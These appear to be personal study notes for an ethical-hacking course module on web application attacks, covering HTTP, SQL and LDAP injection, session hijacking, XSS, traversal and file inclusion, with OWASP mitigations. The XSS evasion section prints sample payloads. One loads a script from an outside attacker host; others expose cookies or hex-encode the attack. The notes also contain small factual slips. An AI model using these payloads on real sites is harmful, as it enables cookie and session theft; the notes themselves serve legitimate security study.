Tags: [[Ethical Hacking]] [[Notes]]

# Module 6 -- Exploiting Application-Based Vulnerabilities
| **Topic Title**                                                                              | **Topic Objective**                                                                     |
| -------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| Overview of Web Application-Based Attacks for Security Professionals and the OWASP Top 10    | explain common web application attacks                                                  |
| how to build your own web application lab                                                    | describe common web application testing tools                                           |
| understanding business logic flaws                                                           | explain how business logic flows enable attackers to exploit web applications           |
| understanding injection-based vulnerabilities                                                | use tool to conduct injection attacks                                                   |
| exploiting authentication-based vulnerabilities                                              | use tools to exploit authentication-based vulnerabilities                               |
| exploiting authorization-based vulnerabilities                                               | explain how authorization-based vulnerabilities are exploited                           |
| understanding cross-site scripting (XSS) vulnerabilities                                     | explain cross-site scripting vulnerabilities                                            |
| understanding cross-site request forgery (CSRF/XSRF) and server-side request forgery attacks | exploain cross-site request forgery (CSRF/XSRF) and server-side request forgery attacks |
| understanding clickjacking                                                                   | explain clickjacking                                                                    |
| exploiting security misconfigurations                                                        | explain how security misconfigurations are exploited                                    |
| exploiting file inclusion vulnerabilities                                                    | explain how file inclusion vulnerabilities are epxloited                                |
| exploiting insecure code practices                                                           | explain how to exploit insecure code                                                    |
## 6.1 – Overview of Web Application-Based Attacks for Security Professionals and the OWASP Top 10
### 6.1.2 – The HTTP Protocol
- the HTTP 1.1 protocol is defined in RFCs 7230-7235
- HTTP is made from stateful protocols, such as FTP, SMTP, IMAP, and POP
	- stateful means sequences of related commands are treated as a single interaction
- HTTP proxies act as both servers and clients
- HTTP is an application-level protocol in the TCP/IP protocol suite
- HTTP request methods
	- *GET* - retrieves info from the server
	- *HEAD* - bascially the same as GET but only returns HTTP headers
	- *POST* - sends data to the server
	- *TRACE* - does a message loopback test along the path to the target resource
	- *PUT* - uploads a representation of the specified URI
	- *DELETE* - deletes the specified resource
	- *OPTIONS* - returns the HTTP methods that the server supports
	- *CONNECT* - converts the request connection to a transparent TCP/IP tunnel
- *the URI and path-to-resource field* - represents the path portion of the requested URL
- *the request version-number field* - this specifies the version of HTTP used by the client
- *the user agent* - information about user access (browser, OS)
- *other fields*
	- *accept
	- *accept-language
	- *accept encoding*

**HTTP URL Structure**
- *schema* - portion of the URL that designates the underlying protocol  to be used
- *host* - IP address for the web server being accessed
- *port* - optional portion of URL designates the port number to which the target web server listens
- *path* - pwd
- *path-segment-params* - portion of the URL that includes optional name/value pairs
- *query-string* - contains name/value pairs that represent dynamic parameters associated with the request
### 6.1.4 – Web Sessions
A web session is a sequence of HTTP request and response transactions between a web client and a server
- preauth tasks
- authentication process
- session management
- access control
- session finalization
### 6.1.6 – OWASP Top 10
*Open Web Application Security Project (OWASP)* is an international org dedicated to educating industry professionals, creating tools, and evangelizing best practices for securing web applications and underlying systems
## 6.2 – How to Build Your Own Web Application Lab
## 6.3 – Understanding Business Logic Flaws
*Business Logic Flaws* enable an attacker to use legit transactions and flows of an application in a way that results in a negative behavior or outcome
**Examples of Business Logic Flaws**
- unverified ownership
- authentication bypass using an alternate path or channel
- authorization bypass thru user-controlled key
- weak password recovery mechanism for forgotten password
- incorrect ownership assignment
- allocation of resources without limits or throttling
- premature release of resource during expected lifetime
- improper enforcement of a single. unique action
- improper enforcement of a behavioral workflow
## 6.4 – Understanding Injection-Based Vulnerabilities
### 6.4.2 – SQL Injection Vulnerabilities
SQL injection vulnerabilities can be catastrophic because they can allow an attacker to view, insert, delete, or modify records in a database
- SELECT
- UPDATE
- DELETE
- INSERT INTO
- CREATE DATABASE
- ALTER DATABASE
- CREATE TABLE
- ALTER TABLE
- DROP TABLE
- CREATE INDEX
- DROP INDEX

SQL Statements are divided into these 6 categories
- data definition language (DDL) statements
- data manip language (DML) statements
- transaction control statements
- system control statements
- embedded sql statements

Web apps construct SQL statements involved SQL syntax invoked by the application mixed with user-supplied data

**SQL Injection Categories**
- in-band SQL injection
	- attacker obtains data using same channel used to inject SQL
	- most basic form of injection
	- data dumped directly in a webapp
- out-of-band SQL injection
	- attacker retrieves data using different channel
		- email, text, or dm of som kind
- blind, or inferential, SQL injection
	- attacker does not make the application display or transfer any data, rather reconstructs information by sending specific statements and discerning the behavior of the app and database

Five techniques that can be used to exploit SQL injection vulnerabilities
- union operator
	- used when an SQL injection vulnerability allows a SELECT statement to combine to queries into a single result or a set of results
- Boolean
	- this is used to verify whether certain conditions are true or false
- error-based technique
	- used to force the database to generate an error in order to enhance and refine an attack
- out-of-band technique
	- used to obtain records from db by using diff channel
- time delay
	- possible to use db commands to delay answers
		- attacker may use this when no error messages

**Database Fingerprinting**
- in order to execute complex queries and exploit different combinatioins of SQL injections, you must first fingerprint the database

**The UNION Exploitation Technique**
- UNION combines result of two sets or more SELECT statements
- by default, UNION only selects distinct values, but can use UNION ALL to bypass

**Booleans in SQL Injection Attacks**
- boolean technique is used in blind SQL injection attacks

**Out-of-Band Exploitation**
- useful when exploiting bilind SQL injection vulnerability
- can use Database Management System (DBMS) functions to execute an out-of-band connection to obtain the results of the blind SQL injection attack

**Stacked Queries**
- use semicolons to separate statements

**The Time-Delay SQL Injection Technique**
- blind Boolean technique
**Surveying a Stored Procedure SQL Injection**
a stored procedure is one or more SQL statements or a reference to a SQL server
	can acept input parameters and return multiple values in the form of output parameters to the calling program

**SQL Injection Mitigation**
- input validaton
- static queries
- parmaterized queries
- stored procedures
### 6.4.4 – Command Injection Vulnerabilities
an attack in which an attacker tries to execute commands that he or she is not supposedto be able to execute
### 6.4.6 – Lightweight Directory Access Protocol (LDAP) Injection Vulnerabilities
Two general types
- Authentication bypass
	- most basic LDAP attacks are launched to bypass password and credential checking
- information disclosure
	- an attacker could inject crafted LDAP packets to list all resources in an org’s directory and perform recon
## 6.5 – Exploiting Authentication-Based Vulnerabilities
### 6.5.2 – Session Hijacking
- web session is a sequence of HTTP request and response transactions between a web client and a server
![[Pasted image 20250729150732.png]]
Session ID names used by the most common web application development frameworks can be easily fingerprinted
- *PHP:* PHPSESSID
- *J2EE:* JSESSIONID
- *ColdFusion:* CFID and CFTOKEN
- *ASP.NET:* ASP.NET_SessionId
Several ways an attacker can perform session hijacking and several ways a session token may be compromised
- *Predicting session tokens:* important to use non-predictable tokens
- *Session sniffing:* this can occur through collecting packets of unencrypted web sessions
- *On-path attack:* MITM
### 6.5.4 – Redirect Attacks
Unvalidated redirects and forwards are vulnerabilities that an attacker can use to attack a web application and its clients
- can exploit these vulnerabilities when a  web server accepts untrusted input
### 6.5.5 – Default Credentials
Many orgs have devices that are still configured with the default passwords, and those are huge areas of surface susceptible to attack
### 6.5.6 – Kerberos Vulnerabilities
if a system is connected to a domain, the attacker can identify a Kerberos ticket-granting ticket (KRBTGT) password hash to get the golden ticket
Another Kerberos weakness is the use of unconstrained Kerberos delegation
- a feature that allows an application to reuse the end-user credentials to access resources hosted on a different server
## 6.6 – Exploiting Authorization-Based Vulnerabilities
### 6.6.2 – Parameter Pollution
*HTTP Parameter Pollution (HPP)* vulnerabilities can be introduced if multiple HTTP parameters have the same name
- attacker can find HPP vulnerabilities by finding forms or actions that allow user-supplied input
### 6.6.4 – Insecure Direct Object Reference Vulnerabilities
*Insecure Direct Object Reference* Vulnerabilities can be exploited when web applications allow direct access to objects based on user input
## 6.7 – Understanding Cross-Site Scripting (XSS) Vulnerabilities
### 6.7.2 – Reflected XSS Attacks
*Reflected XSS* attacks occur when malicious code or scripts are injected by a vulnerable web application using any method that yields a response as part of a valid HTTP request
**Step 1**
- attacker finds vulnerability in the web server
**Step 2**
- attacker sends a malicious link to the victim
**Step 3**
- victim clicks on malicious link, and the attack is sent to the vulnerable server
**Step 4**
- attacker is reflected to the victim and is executed
**Step 5**
- victim sends information to the attacker
### 6.7.4 – Stored XSS Attacks
*Stored/Persistent XSS* attacks occur when malicious code or script is permanently stored on a vulnerable or malicious server, using a database
- typically carried out on websites hosting blog posts, web forums, and other permanent storage methods
### 6.7.6 – XSS Evasion Techniques
XSS Javascipt Injection
```html
<SCRIPT SRC=http://maliciious.h4cker.org/xss.js></SCRIPT>
```
HTML img tag can be used to evade XSS Filters
```HTML
<img src="javascript:alert('xss');">
<img src=javascript:alert('xss')>
<img src=javascript:alert(&quot;XSS&quot;)>
<img src=javascript:alert('xss')>
```
Use other malicious HTML tags
```HTML
<a onmouseover="alert(document.cookie)">This is a malicious link</a>
<a onmouseover=alert(document.cookie)>This is a malicious link</a>
```
Attacker may use combination of hex HTML character references to potentially evade XS filters
```HTML
<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&
#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```
### 6.7.7 – XSS Mitigations
The following are general rules for preventing XSS attacks, according to OWASP
- use an auto-escaping template system
- never insert untrusted data except in allowed locations
- use HTML escape before inserting untrusted data into HTML element content
- use attribute escape before inserting untrusted data into HTML common attributes
- use javascript escape before inserting untrusted data into javascript data values
- use CSS escape and strictly validate before inserting untrusted data into HTML-style property values
- use URL escape before inserting untrusted data into HTML URL parameter values
- sanitize HTML markup with a library such as ESAPI to protect the underlying application
- prevent DOM-based XSS by following [OWASP’s recommendations](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- use the HTTPOnly cookie flag
- implement content security policy
- use the X-XSS-Protection response header

Additional best practices for preventing XSS attacks
- escape all characters (including spaces but excluding alphanumeric characters) with the HTML entity & #xHH ; format (where HH is a hex value)
- use URL encoding only, not the entire URL or path fragments of a URL, to encode parameter values
- escape all characters
- CSS escaping
- educate users about safe browsing to reduce their risk of falling victim to XSS attacks
## 6.9 – Understanding Clickjacking
### 6.9.1 – Overview
*Clickjacking* involves using multiple transparent or opaque layers to induce a user into clicking on a web button or link on a page that they were not intended to navigate or click
## 6.10 – Exploiting Security Misconfigurations
### 6.10.2 – Exploiting Directory Traversal Vulnerabilities
*Directory Traversal* vulnerabilities can allow attackers to access files and directories that are stored outside the web root folder
- exploit path traversal byt manipulating variables that reference files with ../ sequence
A few best practices for preventing and mitigating directory traversal vulnerabilities
- understand how the underlying operating system processes filenames provided by a user or an application
- never store sensitive configuration files inside the web root directory
- prevent user input when using file system calls
- prevent users from supplying all parts of the path
- perform input validation by only accepting known good input
### 6.10.4 – Cookie Manipulation Attacks
*Cookie Manipulation Attacks* are often referred to as stored DOM-based attacks
- possible when vulnerable applications store user input and then embed that input ina response within a part of the DOM
## 6.11 – Exploiting File Inclusion Vulnerabilities
### 6.11.2 – Local File Inclusion Vulnerabilities
*Local File Inclusion (LFI)* occurs when a web application allows a user to submit input into the files or upload the files to the server
- successful exploitation could allow an attacker to read and execute files on the victim’s system
### 6.11.3 – Remote File Inclusion Vulnerabilities
*Remote Inclusion (RFI)* are similar to LFI, but when an attacker exploits RFI, instead of accessing a file on the victim, the attacker is able to execute code hosted on the attacking system
## 6.12 – Exploiting Insecure Code Practices
- comments in source code sometimes contain sensitive content
- lack of error handling can provide valuable information to attackers
- hard-coded credentials – just don't do this lol
- race conditions – application attempts to perform multiple operations simultaneously, requiring them to be done in a specific sequence. attackers can exploit vulnerabilities during the small window of time between security controls taking effect and the attack being performed
- unprotected APIs
- hidden elements
- lack of code signing
- additional web application hacking tools